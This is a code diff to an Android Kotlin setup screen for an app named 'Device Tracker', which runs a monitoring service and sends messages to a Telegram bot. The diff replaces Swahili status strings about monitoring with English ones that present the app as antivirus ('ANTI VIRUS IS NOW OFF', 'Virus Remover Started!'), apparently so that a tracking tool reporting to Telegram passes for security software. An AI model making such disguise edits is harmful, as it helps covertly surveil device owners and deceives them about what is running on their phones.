@@ -76,7 +76,7 @@ class SetupActivity : AppCompatActivity() {
             stopService(Intent(this, MonitorService::class.java))
             prefs.setServiceRunning(false)
             updateStatusDisplay()
-            Toast.makeText(this, "🛑 Ufuatiliaji umesimama", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "🛑 ANTI VIRUS IS NOW OFF", Toast.LENGTH_SHORT).show()
         }
 
         // ===== Jaribu Muunganisho =====
@@ -96,16 +96,16 @@ class SetupActivity : AppCompatActivity() {
                 val ok = withContext(Dispatchers.IO) {
                     TelegramHelper.sendMessage(
                         token, chatId,
-                        "✅ *Device Tracker - Majaribio*\n\nMuunganisho umefanikiwa! App iko tayari."
+                        "✅ *Device Tracker - Test*\n\nConnected successfully"
                     )
                 }
                 binding.btnTest.isEnabled = true
-                binding.btnTest.text = "🔗 Jaribu Muunganisho"
+                binding.btnTest.text = "🔗 Tst Connection"
 
                 if (ok) {
-                    Toast.makeText(this@SetupActivity, "✅ Ujumbe wa majaribio umetumwa!", Toast.LENGTH_LONG).show()
+                    Toast.makeText(this@SetupActivity, "✅ Settup messagesent!", Toast.LENGTH_LONG).show()
                 } else {
-                    Toast.makeText(this@SetupActivity, "❌ Imeshindwa! Angalia Token na Chat ID", Toast.LENGTH_LONG).show()
+                    Toast.makeText(this@SetupActivity, "❌ Fail! Chek up Token na Chat ID", Toast.LENGTH_LONG).show()
                 }
             }
         }
@@ -136,12 +136,12 @@ class SetupActivity : AppCompatActivity() {
             startService(intent)
         }
         updateStatusDisplay()
-        Toast.makeText(this, "✅ Ufuatiliaji umeanzishwa!", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "✅ Virus Remover Started!", Toast.LENGTH_SHORT).show()
     }
 
     private fun updateStatusDisplay() {
         val running = prefs.isServiceRunning()
-        binding.tvStatus.text = if (running) "Hali: 🟢 Inaendesha" else "Hali: 🔴 Imesimama"
+        binding.tvStatus.text = if (running) "ping: 🟢 run" else "ping: 🔴 stopped"
         binding.btnStop.isEnabled = running
         binding.btnActivate.isEnabled = !running
     }
